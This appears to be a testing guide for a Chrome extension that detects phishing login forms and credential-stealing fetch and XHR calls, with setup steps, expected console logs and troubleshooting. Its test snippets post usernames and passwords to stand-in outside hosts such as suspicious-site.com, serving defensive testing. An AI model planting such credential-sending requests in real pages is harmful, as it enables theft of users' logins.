# Testing Guide - Fake Form Detection Extension

## 🐛 Issues Fixed

### 1. Alert Not Showing on Test Site
**Problem**: The extension wasn't detecting suspicious forms on the test site.

**Fixes Applied**:
- ✅ Added immediate form scanning on page load (not just on submit)
- ✅ Added warning banner that shows immediately when suspicious form is detected
- ✅ Enhanced initialization to run multiple times (immediate, DOMContentLoaded, delayed)
- ✅ Added comprehensive console logging for debugging
- ✅ Fixed CONFIG loading fallback if config.js doesn't load properly

### 2. API Call Detection
**Problem**: Suspicious API calls (fetch/XHR) weren't being detected.

**Fixes Applied**:
- ✅ Enhanced fetch interception to detect:
  - Credential fields in request body (password, email, username, etc.)
  - Suspicious domains (external URLs)
  - FormData and URLSearchParams parsing
- ✅ Enhanced XHR interception with same improvements
- ✅ Added detection for PATCH method in addition to POST/PUT
- ✅ Better body parsing for different data types
- ✅ Shows alert modal when suspicious API calls are detected

## 🧪 Testing the Test Site

### Step 1: Load the Extension
1. Open Chrome and go to `chrome://extensions/`
2. Enable **Developer mode**
3. Click **Load unpacked** and select the `extension` folder
4. Verify extension is loaded (should show v1.0.0)

### Step 2: Open Test Site
1. Open `test-site/fake-login.html` in your browser
2. Open browser console (F12) to see debug logs
3. You should see:
   ```
   [FFD] Initializing Fake Form Detection Extension...
   [FFD] Found 1 forms on page
   [FFD] Form info: {...}
   [FFD] ⚠️ Suspicious form detected! Reasons: [...]
   ```

### Step 3: Expected Behavior
1. **Warning Banner** should appear at the top of the page immediately
   - Red banner with "⚠️ Suspicious Login Form Detected"
   - Shows first 2 reasons
   - "View Details" button to see full modal
   - Auto-dismisses after 10 seconds

2. **When you try to submit the form**:
   - Submission is blocked
   - Full warning modal appears
   - Shows all reasons:
     - Form action posts to different domain: fake-instagram.com
     - Page is not loaded over HTTPS
     - Form contains 1 hidden inputs
     - Page UI seems to impersonate instagram but domain is localhost/127.0.0.1

3. **Console Logs** should show:
   ```
   [FFD] Form submission intercepted!
   [FFD] ⚠️ BLOCKING FORM SUBMISSION - Suspicious!
   ```

## 🔍 Testing API Call Detection

### Test 1: Fetch API with Credentials
Add this to a test page:

```javascript
fetch('http://suspicious-site.com/login', {
  method: 'POST',
  body: JSON.stringify({
    username: 'test',
    password: 'test123'
  })
});
```

**Expected**: Modal should appear blocking the request

### Test 2: XHR with Credentials
```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'http://suspicious-site.com/login');
xhr.send('username=test&password=test123');
```

**Expected**: Modal should appear blocking the request

### Test 3: FormData Submission
```javascript
const formData = new FormData();
formData.append('email', 'test@example.com');
formData.append('password', 'test123');
fetch('http://external-domain.com/login', {
  method: 'POST',
  body: formData
});
```

**Expected**: Should detect and block

## 📊 Console Debugging

All detection events are logged to console with `[FFD]` prefix:

- `[FFD] Initializing...` - Extension starting
- `[FFD] Found X forms on page` - Form scanning
- `[FFD] Form info:` - Form analysis results
- `[FFD] Risk evaluation reasons:` - Why form is suspicious
- `[FFD] ⚠️ Suspicious form detected!` - Alert triggered
- `[FFD] Form submission intercepted!` - Form submit blocked
- `[FFD] Fetch intercepted:` - API call detected
- `[FFD] ⚠️ Suspicious fetch detected!` - API call blocked

## ✅ Verification Checklist

- [ ] Extension loads without errors in `chrome://extensions/`
- [ ] Test site shows warning banner on page load
- [ ] Console shows `[FFD]` debug logs
- [ ] Form submission is blocked
- [ ] Warning modal appears on form submit
- [ ] Fetch API calls with credentials are detected
- [ ] XHR calls with credentials are detected
- [ ] Safe Browsing API check works (if API key configured)

## 🐛 Troubleshooting

### No Alert Shows
1. **Check Console**: Look for `[FFD]` logs
2. **Check Extension**: Verify it's loaded and enabled
3. **Check Form**: Make sure form has password field
4. **Reload Page**: Hard refresh (Ctrl+Shift+R)

### API Calls Not Detected
1. **Check Console**: Should see `[FFD] Fetch intercepted:` or `[FFD] XHR intercepted:`
2. **Verify Method**: Only POST/PUT/PATCH are checked
3. **Check Body**: Must contain credential keywords (password, email, etc.)

### Config Not Loading
- Check `extension/config.js` exists
- Check `manifest.json` includes `config.js` in content scripts
- Extension will use fallback defaults if config fails to load

### Safe Browsing API Not Working
- Verify API key is set in `config.js`
- Check API key is valid in Google Cloud Console
- Check browser console for API errors
- Free tier: 10,000 requests/day

## 🎯 Test Scenarios

### Scenario 1: Basic Phishing Form
- ✅ HTTP page (not HTTPS)
- ✅ Domain mismatch
- ✅ Brand impersonation
- ✅ Hidden inputs

### Scenario 2: JavaScript-Based Submission
- ✅ fetch() with credentials
- ✅ XHR with credentials
- ✅ External domain

### Scenario 3: Safe Browsing Detection
- ✅ Known phishing URL
- ✅ Malware URL
- ✅ Social engineering URL

### Scenario 4: False Positive Check
- ✅ Legitimate login (Instagram.com)
- ✅ Should NOT trigger warning
- ✅ Should allow submission

## 📝 Notes

- The extension now shows warnings **immediately** on page load, not just on submit
- API call detection is more aggressive and catches more patterns
- All detection is logged to console for debugging
- Safe Browsing API adds ~100-200ms latency per check
